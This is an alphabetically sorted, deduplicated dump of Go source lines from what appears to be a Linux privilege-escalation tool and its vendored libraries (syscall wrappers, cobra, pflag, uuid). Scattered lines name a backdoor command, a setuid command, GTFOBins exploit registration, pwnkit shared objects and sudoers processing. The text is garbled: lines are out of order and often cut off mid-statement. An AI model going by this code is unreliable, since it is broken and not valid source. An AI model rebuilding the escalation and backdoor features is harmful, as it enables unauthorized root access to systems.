rawrange.Dest_count = uint16(len(value.Info))
rawrange.Reserved1 = value.Reserved1
rawrange.Reserved2 = value.Reserved2
rawrange.Src_length = value.Src_length
rawrange.Src_offset = value.Src_offset
rawsocketcall(SB)
rc = uint32(r0)
rcvBufSize        uint32
rcvWnd            uint32
rdb := (
rdb.reparseBuffer))
rdbbuf[0]))
reXmtCount        uint32
read 
read := 0
readBuf := t.inBuf[len(t.remainder):]
readSize := size - read
readSize = int(v.pageSize)
readlink(const char 
realArgCount := finalCmd.Flags().NArg()
reasonCode)
rec := buf[:reclen]
recHeader := (
recHeader)) 
received []byte
reclen := int(entry.Reclen)
reclen := roundup(fixedSize
reclen > len(buf) {
reclen]
recvAddr uintptr
recvflags = int(msg.Flags)
regerrno = syscall.Errno(r0)
regexp.Regexp
regexp.Regexp) (
register(
registerGTFOBinsExploit(
regs))}
regsout))}
relinquishment in perpetuity of all present and future rights to this
remainder []byte
remaining = uint(r0)
remainingOnLine := t.termWidth - t.cursorX
remote            [28]byte // union of sockaddr4 and sockaddr6
remote        [28]byte // union of sockaddr4 and sockaddr6
remoteIov[0])
remoteMachineName   [SP_MAX_MACHINENAME_LENGTH]uint16
remove(path string) (err error)
removexattr(const char 
rename(const char 
reparseBuffer byte
reparseDataBuffer)(unsafe.Pointer(
replication controllers following 
reqSize := uint32(1024)
reqSize := uint32(2048)
reqSize := uint32(256)
reqSize := uint32(4)
reqSize)
request := (
request.
request.filter.flags 
request.filter.ident = nwmFilterIdentifier
request.filter.local[0]))
request.header.ident = nwmHeaderIdentifier
request.header.length = uint32(unsafe.Sizeof(request.header))
request.header.nwmType = nwmGlobalStatsType
request.header.nwmType = nwmTCPConnType
request.header.options = 0x80000000
request.header.version = nwmCurrentVer
require (
res = Errno(r0)
res)))
resData = Handle(r0)
resInfo = Handle(r0)
resType16)
reserved1               [8]byte
reserved1              [2]byte
reserved1          [2]uintptr
reserved10             [96]byte
reserved11             [128]byte
reserved12             [1]uintptr
reserved2               [3]uintptr
reserved2          [2]uintptr
reserved3              uintptr
reserved3          [2]uintptr
reserved4              [3]uintptr
reserved4          [8]byte
reserved5              uintptr
reserved5          [3]uintptr
reserved6              uint32
reserved6          uintptr
reserved7              uintptr
reserved8              uint32
reserved9              [45]uintptr
resolved)
resourceId        uint32
resourceId    uint32
resourceName      [8]byte
resourceName  [8]byte
responseBuffer := [4096]byte{0}
responseBuffer = [4096]byte{0}
responseBuffer[0])
responseBuffer[0]))
responseBuffer[offset]))
responseBuffer[offset])))
responseBuffer[request.header.outputDesc.offset]))
rest := t.remainder
result := make([]
result = int(r0)
result[i] = c
result[i] = flags[NormalizedName(name)]
ret := UTF16ToString(bufToUTF16(buf))
ret := []string{}
ret = (
ret = CONFIGRET(r0)
ret = Errno(r0)
ret = int(r0)
ret = int32(r0)
ret = procSubscribeServiceChangeNotifications.Find()
ret = r0 != 0
ret = ret[:len(ret)-1]
ret = syscall.Errno(r0)
ret = uint32(r0)
ret = uintptr(r0)
retCl = cl[:clp.Len]
retData = data[:datap.Len]
retransDrops      uint32
retransSegs       uint32
retransTimeouts   uint32
return
return 
return !v.Equal(c)
return (
return ((1 << (57 
return ((len(arg) >= 3 
return ((struct tuple 
return ((uint64(major) << 32) 
return ((x 
return (16 
return (b1 << 4) 
return (int64(tv.Sec)
return (ioctl >> 16) 
return (salen 
return (uint64(major) << 16) 
return (uint64(major) << 24) 
return (uint64(major) << 8) 
return -1
return 0
return 1
return ByteSliceToString(ifr.raw.Ifrn[:])
return ByteSliceToString(s.Slice())
return Chdir(path)
return CloseHandle(Handle(t))
return CloseHandle(fd)
return CommandLine.Arg(i)
return CommandLine.Lookup(name)
return CommandLine.Parsed()
return CommandLine.ShorthandLookup(name)
return DeleteFile(pathp)
return Domain(uuid[9])
return EACCES
return EBADF
return EEXIST
return EFAULT
return EINVAL
return ENOENT
return ENOSYS
return ENOTSUP
return EOPNOTSUPP
return EpollCreate1(0)
return ErrUnsupported
return Fd2path(fd)
return FileHandle{fh}
return FlushFileBuffers(fd)
return FreeLibrary(d.Handle)
return Future
return InotifyInit1(0)
return InstallToPath(path)
return Itimerval{
return Logger{}
return Microsoft
return Must(NewRandom())
return Must(NewRandom()).String()
return Must(NewVersion(segmentsOnly))
return NewRandomFromReader(rander)
return RFC4122
return RemoveDirectory(pathp)
return Reserved
return SetCurrentDirectory(pathp)
return SetupDiCancelDriverInfoSearch(deviceInfoSet)
return SetupDiDestroyDeviceInfoList(deviceInfoSet)
return SetupDiGetDeviceInfoListDetail(deviceInfoSet)
return SetupDiGetSelectedDevice(deviceInfoSet)
return Signal(w 
return Signal(w>>16) 
return Signal(w>>8) 
return Signal(w>>shift) 
return SysctlArgs(name)
return SysctlUint32Args(name)
return Time(time)
return Timespec{
return Token(
return TrusteeValue(unsafe.Pointer(StringToUTF16Ptr(str)))
return TrusteeValue(unsafe.Pointer(objectsAndName))
return TrusteeValue(unsafe.Pointer(objectsAndSid))
return TrusteeValue(unsafe.Pointer(sid))
return UTF16PtrToString(sddl)
return UTF16ToString((
return UTF16ToString(bufW[:wcslen(bufW)])
return UTF16ToString(data.description[:])
return UTF16ToString(data.drvDescription[:])
return UTF16ToString(data.infFileName[:])
return UTF16ToString(data.mfgName[:])
return UTF16ToString(data.providerName[:])
return UTF16ToString(data.remoteMachineName[:])
return UTF16ToString(data.sectionName[:])
return UTF16ToString(params.driverPath[:])
return UTF16ToString(s.Slice())
return Version(uuid[6] >> 4)
return []string{}
return _GetHostByName(_p0)
return _GetProtoByName(_p0)
return _LoadLibrary(_p0)
return _SetDllDirectory(_p0)
return a
return acct(nil)
return acct(pathp)
return activeHelpCfg
return actual.GreaterThanOrEqual(vulnerable) 
return addRepo(args)
return al.data
return args
return args[1:]
return av.Int() == bv.Int()
return av.String() == bv.String()
return b
return b[1:]
return b[2:]
return b[4:]
return b[8:]
return b[n:]
return base64.StdEncoding.EncodeToString([]byte(bytesBase64))
return bb.String()
return binary.BigEndian.Uint32(uuid[0:4])
return bsv
return buf.String()
return c
return c.Execute()
return c.ExecuteC()
return c.Flags().ArgsLenAtDash()
return c.Flags().HasAvailableFlags()
return c.Flags().HasFlags()
return c.GenBashCompletion(outFile)
return c.InheritedFlags().HasAvailableFlags()
return c.InheritedFlags().HasFlags()
return c.LocalFlags()
return c.LocalFlags().HasAvailableFlags()
return c.LocalFlags().HasFlags()
return c.Name()
return c.Parent().CommandPath() 
return c.Parent().HelpFunc()
return c.Parent().Root()
return c.Parent().UsageFunc()
return c.PersistentFlags().HasAvailableFlags()
return c.PersistentFlags().HasFlags()
return c.Root().ExecuteC()
return c.Run != nil 
return c.UsageFunc()(c)
return c.commandCalledAs.name
return c.commands
return c.ctx
return c.errWriter
return c.flagErrorFunc
return c.flags
return c.getErr(os.Stderr)
return c.getIn(os.Stdin)
return c.getOut(os.Stderr)
return c.getOut(os.Stdout)
return c.globNormFunc
return c.helpFunc
return c.helpTemplate
return c.iflags
return c.inReader
return c.lflags
return c.op == con.op 
return c.original
return c.outWriter
return c.parent
return c.parent != nil
return c.parent.FlagErrorFunc()
return c.parent.HelpTemplate()
return c.parent.UsageTemplate()
return c.parent.VersionTemplate()
return c.parent.commandsMaxCommandPathLen
return c.parent.commandsMaxNameLen
return c.parent.commandsMaxUseLen
return c.parent.getErr(def)
return c.parent.getIn(def)
return c.parent.getOut(def)
return c.pflags
return c.usageFunc
return c.usageTemplate
return c.versionTemplate
return canDoSearchSystem32Once.v
return caprver(rights.Rights[0])
return capver(rights) 
return chdir(path)
return clockSequence()
return cmd
return cmd.Flag(name)
return cmd.Root().GenPowerShellCompletion(out)
return cmd.Root().GenPowerShellCompletionWithDesc(out)
return cmd.Root().GenZshCompletion(out)
return cmd.Root().GenZshCompletionNoDesc(out)
return cmd.Traverse(args[i
return cmd.Wait()
return cmsgAlignOf(SizeofCmsghdr) 
return commandLine
return commands
return compare
return completions
return connectExFunc.err
return cpu / _NCPUBITS
return cpuMask(1 << (uint(cpu) % _NCPUBITS))
return cs[i].check.LessThan(cs[j].check)
return cstring(buf[:])
return csvReader.Read()
return d
return d[len(s)][len(t)]
return def
return destp
return dev
return dstPos
return dsv
return e
return e.epollcreate(4)
return e1
return epollEvts
return err
return err == nil
return errEAGAIN
return errEINVAL
return errENOENT
return errERROR_EINVAL
return errERROR_IO_PENDING
return errno
return errnoErr(e)
return errnoErr(errno)
return errorList[i].name
return errorList[i].num >= e
return esc
return exp
return f
return f.FlagUsagesWrapped(0)
return f.argsLenAtDash
return f.args[i]
return f.formal[name]
return f.lookup(f.normalizeFlagName(name))
return f.normalizeNameFunc
return f.output
return f.parsed
return f.shorthands[c]
return false
return fds
return fds.Bits[fd/NFDBITS]
return flag
return flag.Changed
return flag.ErrHelp
return flag.Hidden 
return fmt.Errorf(
return found
return ft
return func(c 
return func(cmd 
return func(f 
return getSecurityDescriptorLength(sd)
return getSize(fd)
return getState(fd)
return getTime()
return hdr
return i
return ifname
return ifreqData{
return impl.epollcreate(size)
return impl.epollcreate1(flag)
return info
return inout 
return int((right >> 57) 
return int((w >> 8) 
return int(GetLengthSid(sid))
return int(binary.BigEndian.Uint16(uuid[8:10])) 
return int(clockSeq 
return int(gettid())
return int(info.Window.Right - info.Window.Left 
return int(n)
return int(pe.ParentProcessID)
return int(right >> 62)
return int(w >> shift)
return int(w>>shift) 
return int(w>>shift) >> 8
return int64(hi)<<32 
return int64(r0)
return int64(ts.Sec)
return int64(tv.Sec)
return iovecs
return ipsv
return isTerminal(fd)
return isValidSecurityDescriptor(sd)
return isValidSid(sid)
return isv
return json.Marshal(nu.UUID)
return key >= 32 
return keys
return l.input.Read(p)
return left > right
return len(c.Example) > 0
return len(c.commands) > 0
return len(cs)
return len(f.formal) > 0
return len(str)
return len(v)
return length
return logger
return major
return makeRaw(fd)
return mapper.Munmap(b)
return matched
return matches[0]
return minCommandPathPadding
return minNamePadding
return minUsagePadding
return minor
return n.String()
return name
return newRandomFromPool()
return nid[:]
return nil
return nil // valid null UUID
return node[:]
return nsec
return nu.UUID.MarshalText()
return nu.UUID.Value()
return ok
return open()
return os.Remove(path)
return os.Stderr
return osreldate >= ver
return out
return outLen == uint32(unsafe.Sizeof(isElevated)) 
return output
return p
return p.addr
return p.proc.Addr()
return p.proc.Call(a...)
return password
return pflag.NormalizedName(name)
return poll(
return pollEvts
return pos - t.pos
return ppoll(
return procCancelIoEx.Find()
return procCreateSymbolicLinkW.Find()
return procGetAddrInfoW.Find()
return procGetSystemTimePreciseAsFileTime.Find()
return procSetFileCompletionNotificationModes.Find()
return ptmx.Close()
return pv
return r
return readAsCSV(sval)
return readPassword(fd)
return readPasswordLine(f)
return readPasswordLine(passwordReader(fd))
return remove(path)
return result
return ret
return rootCmd.Execute()
return rsa.Sockaddr()
return rtlNtStatusToDosErrorNoTeb(s)
return s
return s 
return s[i]
return scratch
return segmentSlice
return sendRecvMsgFunc.err
return setNodeInterface(name)
return setfsgid(gid)
return setfsuid(uid)
return shmdt(uintptr(unsafe.Pointer(
return sid.Copy()
return sig
return signalList[i].name
return signalList[i].num >= s
return signalNameMap[s]
return slice
return ssv
return str
return strconv.Atoi(sval)
return strconv.FormatBool(val)
return strconv.ParseBool(sval)
return strconv.ParseBool(val)
return string(arr)
return string(arr[:nulli])
return string(b)
return string(buf[:])
return string(buf[i:])
return string(d.Name[:d.Namlen])
return string(n)
return string(qs[:j])
return string(s)
return string(s[:i])
return string(str[:i])
return string(utf16.Decode(b[:n]))
return string(utf16.Decode(s))
return string(utf16.Decode(str[:chars-1]))
return suggestions
return suggestionsString
return syscall.Chdir(path)
return syscall.EINVAL
return syscall.EWINDOWS
return syscall.Environ()
return syscall.GetErrno()
return syscall.Getenv(key)
return syscall.Getpagesize()
return syscall.Getwd()
return syscall.NewCallback(fn)
return syscall.NewCallbackCDecl(fn)
return syscall.Signal(w 
return syscall.Signal(w>>shift) 
return syscall.Unsetenv(key)
return sysctlMib[i].ctlname >= name
return t.pos - pos
return t.readLine()
return term.GetSize(fd)
return term.GetState(fd)
return term.IsTerminal(fd)
return term.MakeRaw(fd)
return term.ReadPassword(fd)
return time.Duration(getTickCount64()) 
return time.ParseDuration(sval)
return time.ParseDuration(val)
return totalTime / time.Duration(samples)
return true
return uint16(b[0]) 
return uint32((dev 
return uint32((dev >> 16) 
return uint32((dev >> 24) 
return uint32((dev >> 8) 
return uint32(b[0]) 
return uint32(dev 
return uint32(unsafe.Offsetof(DevInfoListDetailData{}.remoteMachineName) 
return uint32(unsafe.Offsetof(DrvInfoDetailData{}.hardwareID) 
return uint32(unsafe.Sizeof(DevInfoListDetailData{}))
return uint32(unsafe.Sizeof(DrvInfoDetailData{}))
return uint32(unsafe.Sizeof(Tokenmandatorylabel{})) 
return uint64(((major) << 16) 
return uint64(b[0])
return uint64(b[0]) 
return uint64(b[1]) 
return uint64(b[3]) 
return uint64(b[7]) 
return uint64(lo) 
return uintptr(d.dll.Handle)
return uintptr(unsafe.Pointer(
return uisv
return uitoa(uint(val))
return umount(target)
return unsafe.Pointer(
return unsafe.Pointer(_zero)
return unsafe.Pointer(uintptr(unsafe.Pointer(h)) 
return useline
return utf16.Encode([]rune(s 
return uuid
return uuid.Scan(string(src))
return v
return v == o
return v.Compare(o) < 0
return v.Compare(o) <= 0
return v.Compare(o) == 0
return v.Compare(o) > 0
return v.Compare(o) >= 0
return v.Equal(c)
return v.flagType
return v.inner.Set(s)
return v.inner.String()
return v.metadata
return v.original
return v.pre
return v[i].LessThan(v[j])
return val.String()
return win32Error
returnCode)
returnValue)
retval = int(r0)
reverse
revision byte
revision)
revoke(const char 
rhs := segmentsOther[i]
richgo test -v ./...
right := 0
right = bv.Int()
right = int64(bv.Len())
right = x - t.cursorX
rights granted to you under this License for this implementation of Go
rights.Rights[i] 
rightsp)
rkHYY13jYWTU97c=
rl := rlimit32{}
rl.Cur = rlimInf32
rl.Cur = uint32(rlim.Cur)
rl.Max = rlimInf32
rl.Max = uint32(rlim.Max)
rlim.Cur = rlimInf64
rlim.Cur = uint64(rl.Cur)
rlim.Max = rlimInf64
rlim.Max = uint64(rl.Max)
rlimit32) (err error) = SYS_GETRLIMIT
rlimit32) (err error) = SYS_SETRLIMIT
rlimit32) (err error) = SYS_UGETRLIMIT
rlimit32) (err error) {
rlp)
rm -rf $(BIN)
rm _$i
rmControl)
rmQuote := strings.NewReplacer(
rmdir(const char 
rmt0WindowCount   uint32
rmtSMCBufSz       uint32
rmtSMCLinkId      uint32
rmtp)
rn Erik Pedersen <bjorn.erik.pedersen@gmail.com>
rook
root
rootCmd := c.Root()
rootCmd = 
rootCmd.AddCommand(addCmd)
rootCmd.AddCommand(backdoorCmd)
rootCmd.AddCommand(initCmd)
rootCmd.AddCommand(listCmd)
rootCmd.AddCommand(setuidCmd)
rootCmd.CompletionOptions.DisableDefaultCmd = true
rootCmd.CompletionOptions.DisableDescriptions = true
rootCmd.CompletionOptions.DisableNoDescFlag = true
rootCmd.Flags().BoolVar(
rootCmd.Flags().StringVarP(
rootCmd.PersistentFlags().BoolVarP(
rootCmd.PersistentFlags().StringSliceVarP(
rootCmd.PersistentFlags().StringVar(
rootCmd.PersistentFlags().StringVarP(
rootCmd.RemoveCommand(c)
roundTripTime     uint32
roundTripVar      uint32
rrno<>(SB)
rsa)
rsa))
rsa.Addr.Family = AF_UNIX
rsa.Addr.Len = SizeofSockaddrUnix
rsa.Service_name_len = uint32(length)
rsa.Service_name_len = uint64(length)
rsv)
rtable = int(r0)
rtlGetNtVersionNumbers(
rtlGetNtVersionNumbers(majorVersion 
rtlGetVersion(info 
rtlNtStatusToDosErrorNoTeb(ntstatus NTStatus) (ret syscall.Errno) = ntdll.RtlNtStatusToDosErrorNoTeb
rtp)
run:
runes := []rune(entry)
runes := []rune(t.historyPending)
running 
runtime
runtime.KeepAlive(
runtime.KeepAlive(buf)
runtime.KeepAlive(ctlInfo)
runtime.KeepAlive(ifreq)
runtime.KeepAlive(name16)
runtime.KeepAlive(resType16)
runtime.KeepAlive(str16)
runtime.KeepAlive(unsafe.Pointer(p))
runtime.KeepAlive(value)
runtime.RaceAcquire(addr)
runtime.RaceReleaseMerge(addr)
rusage)
rusage.Stime.Sec = ruz.Stime.Sec
rusage.Stime.Usec = int64(ruz.Stime.Usec)
rusage.Utime.Sec = ruz.Utime.Sec
rusage.Utime.Usec = int64(ruz.Utime.Usec)
rusage_zos) (err error) = SYS_GETRUSAGE
rusage_zos) (err error) {
ruz)
rwdDfMAkV7OtwuqBVzrE8GR6GFx
rx := (
rx[i] = pp.Addr[i]
s := 0
s := args[0]
s := h.Sum(nil)
s := stat.Sys().(
s = (
s = Stat_t{
s = Statfs_t{
s = UTF16ToString(p[data.PrintNameOffset/2 : (data.PrintNameLength-data.PrintNameOffset)/2])
s = s[1:]
s = s[9:]
s = s[:i]
s = stringValue(val)
s = strings.ToLower(s)
s Contribution.
s ability to bring cross-claims or counter-claims.
s negligence to the extent applicable law prohibits such limitation.
s) }
s.Blksize = st.Blksize
s.Blocks = st.Blocks
s.Dev = st.Dev
s.DistroID = DistributionID(strings.TrimSpace(line[3:]))
s.DistroID = UnknownLinux
s.DistroVersion = strings.TrimSpace(line[8:])
s.Dp = (
s.Gid = st.Gid
s.Ino = st.Ino
s.KernelVersion = kernelVersion()
s.Len = int32(unsafe.Sizeof(i))
s.Mode = st.Mode
s.Nlink = st.Nlink
s.Rdev = st.Rdev
s.Size = st.Size
s.Uid = st.Uid
s.attrs = attrs(uint8(s.attrs) 
s.bg = esc
s.changed = true
s.entries[s.head] = a
s.fg = esc
s.head = (s.head 
s.max = defaultNumEntries
s.processDistro()
s.processSudoers(s.Hostname)
s.size
s.value
s.value = []string{val}
s.value = append(
s.value = out
s.value = v
s.value = val
s.value {
s.value)
s.value))
s.value)>>1)
s.value)[k] = v
s[0])
s[i] 
s[i] = 0
s[i])
sa := 
sa := new(SockaddrCtl)
sa := new(SockaddrDatalink)
sa := new(SockaddrInet4)
sa := new(SockaddrInet6)
sa := new(SockaddrL2TPIP)
sa := new(SockaddrL2TPIP6)
sa := new(SockaddrLinklayer)
sa := new(SockaddrNetlink)
sa := new(SockaddrUnix)
sa = makeInheritSa()
sa.Addr = (
sa.Addr = pp.Addr
sa.Addr))
sa.Alen = pp.Alen
sa.ConnId = pp.Conn_id
sa.Data = pp.Data
sa.Dev = string(pp[14:i])
sa.Family = pp.Family
sa.Groups = pp.Groups
sa.Halen = pp.Halen
sa.Hatype = pp.Hatype
sa.ID = pp.Sc_id
sa.Ifindex = int(pp.Ifindex)
sa.Index = pp.Index
sa.InheritHandle = 1
sa.Len = pp.Len
sa.Length = uint32(unsafe.Sizeof(sa))
sa.Name = string(bytes)
sa.Name))
sa.Nlen = pp.Nlen
sa.PGN))
sa.Pad = pp.Pad
sa.Pid = pp.Pid
sa.Pkttype = pp.Pkttype
sa.Port = int(p[0])<<8 
sa.Protocol = pp.Protocol
sa.RxID))
sa.Slen = pp.Slen
sa.TxID))
sa.Type = pp.Type
sa.Unit = pp.Sc_unit
sa.ZoneId = pp.Scope_id
sa.raw.Addr = sa.Addr
sa.raw.Addr = sa.Addr.tipcAddr()
sa.raw.Addr[12] = sa.Addr
sa.raw.Addr[i
sa.raw.Addr[i] = n[i]
sa.raw.Addr[i] = rx[i]
sa.raw.Addrtype = sa.Addr.tipcAddrtype()
sa.raw.Alen = sa.Alen
sa.raw.Bdaddr = sa.Addr
sa.raw.Bdaddr[i] = sa.Addr[len(sa.Addr)-1-i]
sa.raw.Bdaddr_type = sa.AddrType
sa.raw.Channel = sa.Channel
sa.raw.Cid = sa.CID
sa.raw.Cid))
sa.raw.Conn_id = sa.ConnId
sa.raw.Data = sa.Data
sa.raw.Dev = sa.Dev
sa.raw.Dev_idx = sa.DeviceIdx
sa.raw.Dsap = sa.DestinationSAP
sa.raw.Family = AF_ALG
sa.raw.Family = AF_BLUETOOTH
sa.raw.Family = AF_CAN
sa.raw.Family = AF_INET
sa.raw.Family = AF_INET6
sa.raw.Family = AF_IUCV
sa.raw.Family = AF_LINK
sa.raw.Family = AF_NETLINK
sa.raw.Family = AF_PACKET
sa.raw.Family = AF_TIPC
sa.raw.Family = AF_UNIX
sa.raw.Family = AF_VSOCK
sa.raw.Family = AF_XDP
sa.raw.Feat = sa.Feature
sa.raw.Flags = sa.Flags
sa.raw.Groups = sa.Groups
sa.raw.Halen = sa.Halen
sa.raw.Hatype = sa.Hatype
sa.raw.Ifindex = int32(sa.Ifindex)
sa.raw.Ifindex = sa.Ifindex
sa.raw.Index = sa.Index
sa.raw.Len = SizeofSockaddrInet4
sa.raw.Len = SizeofSockaddrInet6
sa.raw.Len = SizeofSockaddrVM
sa.raw.Len = byte(3 
sa.raw.Len = sa.Len
sa.raw.Mask = sa.Mask
sa.raw.Name[i] = ' '
sa.raw.Name[i] = int8(b)
sa.raw.Nfc_protocol = sa.NFCProtocol
sa.raw.Nlen = sa.Nlen
sa.raw.Nodeid[i] = ' '
sa.raw.Pad = sa.Pad
sa.raw.Path[0] = 0
sa.raw.Path[i] = int8(name[i])
sa.raw.Path[i] = uint8(name[i])
sa.raw.Pid = sa.Pid
sa.raw.Pkttype = sa.Pkttype
sa.raw.Port = sa.Port
sa.raw.Port))
sa.raw.Protocol = sa.Protocol
sa.raw.Psm))
sa.raw.Queue_id = sa.QueueID
sa.raw.Sa_family = AF_NFC
sa.raw.Sc_family = AF_SYSTEM
sa.raw.Sc_id = sa.ID
sa.raw.Sc_len = SizeofSockaddrCtl
sa.raw.Sc_unit = sa.Unit
sa.raw.Scope = int8(sa.Scope)
sa.raw.Scope_id = sa.ZoneId
sa.raw.SetServiceNameLen(len(sa.ServiceName))
sa.raw.Shared_umem_fd = sa.SharedUmemFD
sa.raw.Slen = sa.Slen
sa.raw.Ss_sysaddr = AF_SYS_CONTROL
sa.raw.Ssap = sa.SourceSAP
sa.raw.Target_idx = sa.TargetIdx
sa.raw.Type = sa.Type
sa.raw.User_id[i] = ' '
sa.raw.User_id[i] = int8(b)
sa.raw[0])) = AF_PPPOX
sa.raw[i] = 0
sacl  
sacl     
sacl = (
saclDefaulted = _p1 != 0
saclDefaulted {
saclPresent = _p0 != 0
saclPresent {
salign := SizeofPtr
salign = 1
salign = 16
salign = 4
salign = 8
salign = SizeofInt
same = r0 != 0
samples := 100
save_g(SB)   // Save g and stack pointer
sbrk(intptr_t incr)
sbz1        byte
sbz1     byte
sbz2        uint16
sched_yield(void)
scid=kb
script:
sdLen := int(selfRelativeSD.Length())
sdLen = min
search    show     status  
search  (search for a keyword in charts)           status  (display the status of the named release)
search  (search for a keyword in charts)  show  (show information of a chart)  status  (displays the status of the named release)
search  -- search for a keyword in charts
search  show  status
search for a keyword in charts
sec /= 10000000
sec := nsec / 1e9
sec := t.Unix()
sec = int64(t - g1582ns100)
sec--
sectionDesc = (
sectionDesc))
sectionDesc.length
sectionName     [LINE_LEN]uint16
sed 1q $i 
seek(SB)
segmentSlice[i] = int(v)
segments := v.Segments64()
segments []int64
segmentsOther := other.Segments64()
segmentsSelf := v.Segments64()
segments[i] = val
select {
selfNumeric := true
selfNumeric = false
selfPreReleaseLen := len(selfPreReleaseMeta)
selfRelativeSD = (
selfRelativeSDSize)
semconfig(int flag)
semverRegexp  
sendAddr uintptr
sendMSS           uint32
sendRecvMsgFunc.once.Do(func() {
seq = int(b[0])<<8 
serverResourceId  uint32
sessionID = uint32(r0)
set -e
set := cmd.InheritedFlags()
set := func(flag 
set)
setClockSequence(-1)
setClockSequence(seq)
setPassword := fmt.Sprintf(
setSecurityDescriptorControl(sd 
setSecurityDescriptorDacl(sd 
setSecurityDescriptorGroup(sd 
setSecurityDescriptorOwner(sd 
setSecurityDescriptorRMControl(sd 
setSecurityDescriptorSacl(sd 
setcontext(const struct __ucontext 
setegid(gid_t egid)
seteuid(uid_t euid)
setgid(gid_t gid)
setid)
setsid(void)
settimeofday(const struct timeval 
setuid(uid_t uid)
setuidCmd.Flags().StringVarP(
setupDiClassGuidsFromNameEx(className 
setupDiClassNameFromGuidEx(classGUID 
setupDiCreateDeviceInfoListEx(classGUID 
setupDiGetClassDevsEx(classGUID 
setupUninstallOEMInf(infFileName 
setxattr(const char 
sgid)
sh 0<
shGetKnownFolderPath(id 
shall terminate as of the date such litigation is filed.
sharemode := uint32(FILE_SHARE_READ 
shawnps
shellCmd := 
shellCompDirectiveMaxValue
shellWindow = HWND(r0)
shift
shift   = 8
shift = 8
shmaddr)
shmdt(addr uintptr) (err error)
shmdt(addr)
shmdt(const void 
shopt -s nullglob
shorthands        map[byte]
shorthands := s[1:]
should or should not be added (instead of reading the environment variable directly).
show    (show information of a chart)
show    -- show information of a chart
showing the user the 'usage'.
si       int
sid := (
sid = (
sid = int(r0)
sid)
sid2 := (
sig := syscall.Signal(w 
sig)
sigcntxp)
sigev)
sigmask)
signal numbers and strings are generated from 
signalNameMap     map[string]syscall.Signal
signalNameMapOnce sync.Once
signalNameMapOnce.Do(func() {
signalNameMap[signal.name] = signal.num
signals=$(
silenced bool
similarly to how it provides the 
simpleVersion := simpleVersionRegex.FindString(fields[1])
size                     uint32
size                uint32 // Use unsafeSizeOf method
size            uint32
size            uint32 // Use unsafeSizeOf method
size          uint32
size      uint32
size := uint32(128)
size := uint32(32 
size = fh.Bytes 
size = int(r0)
size = uint32(r0)
size int
size)
size) {
size_t len)
sizeofIfData           = 0x98
sizeofIfMsghdr         = 0xa8
skip--
sl := _Socklen(2)
sl := int32(2)
sl := old.Fstypename[:]
sl := struct {
sl = old.Mntfromname[:]
sl = old.Mntonname[:]
sl))
sl)))
sl--
slashes
slashes := 0
slashes = 0
slice flag.Args() or individually as flag.Arg(i).
slice))
slop
slop := 5
slop > len(s) {
smcDActLnkOpened  uint32
smcDActiveOpened  uint32
smcDConnClosed    uint32
smcDCurrEstab     uint32
smcDCurrEstabLnks uint32
smcDInRsts        uint32
smcDInSegs        uint64
smcDLnksClosed    uint32
smcDOutRsts       uint32
smcDOutSegs       uint64
smcDPasLnkOpened  uint32
smcDPassiveOpened uint32
smcDReason        uint32
smcDStatus        byte
smcFlags          byte
smcRActLnkOpened  uint32
smcRActiveOpened  uint32
smcRConnClosed    uint32
smcRCurrEstab     uint32
smcRCurrEstabLnks uint32
smcRInRsts        uint32
smcRInSegs        uint64
smcRLnkActTimeOut uint32
smcRLnksClosed    uint32
smcROutRsts       uint32
smcROutSegs       uint64
smcRPasLnkOpened  uint32
smcRPassiveOpened uint32
smcReason         uint32
smcStatus         byte
sndBufSize        uint32
sndWnd            uint32
so = pwnkit_sh_sharedobj
so = pwnkit_true_sharedobj
sockOpt           byte
sockOpt6          byte
sockOpt6Cont      byte
sockPath string
sockerr = syscall.Errno(r0)
socketcall(SB)
socklen := _Socklen(SizeofSockaddrAny)
socklen)
software to the public domain. We make this dedication for the benefit
software under copyright law.
solaris_amd64)
solution described in this document.
some 
sort
sort >_error.grep
sort >_signal.grep
sort.Interface
sort.Sort(commandSorterByName(c.commands))
sort.Sort(version.Collection(versions))
sort.Stable(left)
sort.Stable(right)
sort.Strings(cmd.Aliases)
sort.Strings(cmd.ArgAliases)
sort.Strings(cmd.ValidArgs)
sort.Strings(keys)
sort.Strings(set)
sort.Strings(unset)
sortedActual      []
sortedFormal      []
source <(%[1]s completion bash)
source <(%[1]s completion zsh)
specification := parts[1]
spf13/pflag
spf13/viper
src := fmt.Sprintf(
src))
srcPos 
srcPos := 0
srcaddr)
ssThresh          uint32
sstk(int incr)
ssv := new(stringArrayValue)
ssv := new(stringSliceValue)
ssv := new(stringToInt64Value)
ssv := new(stringToIntValue)
ssv := new(stringToStringValue)
ssv.value = p
ssv.value = val
st := 
st.convertFrom(
stRingBuffer) Add(a string) {
stack)
start := time.Now()
stat(const char 
stat)
stat.Atim = timespecFromStatxTimestamp(r.Atime)
stat.Atim.Nsec = 0 //zos doesn't return nanoseconds
stat.Atim.Nsec >>= 32
stat.Atim.Sec = int64(statLE.Atim)
stat.Bavail = stat_v.Bavail
stat.Bfree = stat_v.Bfree
stat.Blksize = int32(r.Blksize)
stat.Blksize = int64(statLE.Blksize)
stat.Blocks = int64(r.Blocks)
stat.Blocks = statLE.Blocks
stat.Blocks = stat_v.Blocks
stat.Bsize = stat_v.Bsize
stat.Ctim = timespecFromStatxTimestamp(r.Ctime)
stat.Ctim.Nsec = 0 //zos doesn't return nanoseconds
stat.Ctim.Nsec >>= 32
stat.Ctim.Sec = int64(statLE.Ctim)
stat.Dev = uint64(statLE.Dev)
stat.Ffree = stat_v.Ffree
stat.Files = stat_v.Files
stat.Flags = stat_v.Flag
stat.Frsize = stat_v.Frsize
stat.Fsid = stat_v.Fsid
stat.Gid = r.Gid
stat.Gid = uint32(statLE.Gid)
stat.Ino = r.Ino
stat.Ino = uint64(statLE.Ino)
stat.Mode = uint32(r.Mode)
stat.Mode = uint32(statLE.Mode)
stat.Mtim = timespecFromStatxTimestamp(r.Mtime)
stat.Mtim.Nsec = 0 //zos doesn't return nanoseconds
stat.Mtim.Nsec >>= 32
stat.Mtim.Sec = int64(statLE.Mtim)
stat.Namelen = stat_v.Namemax
stat.Nlink = r.Nlink
stat.Nlink = uint64(statLE.Nlink)
stat.Rdev = uint64(statLE.Rdev)
stat.Size = int64(r.Size)
stat.Size = statLE.Size
stat.Type = 0
stat.Type = uint32(mnt_ent_buffer.filesys_info[i].Fstname[0])
stat.Uid = r.Uid
stat.Uid = uint32(statLE.Uid)
statLE)
stat_freebsd11_t) (err error)
stat_freebsd11_t) (err error) {
stat_freebsd11_t) {
stat_t) (err error)
stat_t) (err error) {
stat_t) {
stat_t{}
stat_v)
state
state                 parserState
state             uint16
state = int(r0)
state)
state.State) bool {
state.SudoEntry
state.termios)
